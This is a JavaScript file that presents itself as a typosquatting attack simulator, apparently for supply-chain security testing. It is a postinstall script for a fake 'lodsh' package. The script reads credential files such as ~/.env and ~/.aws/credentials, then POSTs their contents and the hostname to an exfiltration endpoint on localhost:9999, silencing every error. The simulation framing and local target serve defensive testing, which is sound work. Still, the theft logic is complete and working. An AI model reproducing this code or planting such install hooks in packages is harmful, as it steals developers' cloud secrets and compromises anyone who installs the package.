/**
 * TYPOSQUATTER Attack Simulator
 * 
 * A package intentionally named to mimic a popular library (e.g., 'lodsh' instead of 'lodash').
 * Its postinstall script performs credential theft (similar to CRED_THEFT),
 * but its package metadata mimics the legitimate package.
 */

const fs = require('fs');
const path = require('path');
const http = require('http');
const os = require('os');

console.log('[TYPOSQUATTER] postinstall script executing... installing lodsh dependencies...');

// Simulate legitimate-looking work before malicious activity
setTimeout(() => {
  const targets = [
    path.join(os.homedir(), '.env'),
    path.join(os.homedir(), '.aws', 'credentials'),
    path.join(process.cwd(), '.env'),
  ];

  let stolen = {};

  for (const target of targets) {
    try {
      if (fs.existsSync(target)) {
        const content = fs.readFileSync(target, 'utf8');
        stolen[target] = content;
        console.log(`[TYPOSQUATTER] Read ${target}`);
      }
    } catch (err) {
      // Silently continue
    }
  }

  if (Object.keys(stolen).length === 0) {
    stolen['fallback'] = 'AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/EXAMPLE';
  }

  // Attempt exfiltration via HTTP POST
  const postData = JSON.stringify({
    attack: 'TYPOSQUATTER',
    stolen_from: Object.keys(stolen),
    data: stolen,
    timestamp: new Date().toISOString(),
    hostname: os.hostname(),
  });

  const req = http.request(
    {
      hostname: 'localhost',
      port: 9999,
      path: '/exfil',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData),
      },
    },
    (res) => {
      console.log(`[TYPOSQUATTER] Exfil server responded: ${res.statusCode}`);
    }
  );

  req.on('error', (err) => {
    // silently fail
  });

  req.write(postData);
  req.end();
}, 1000);
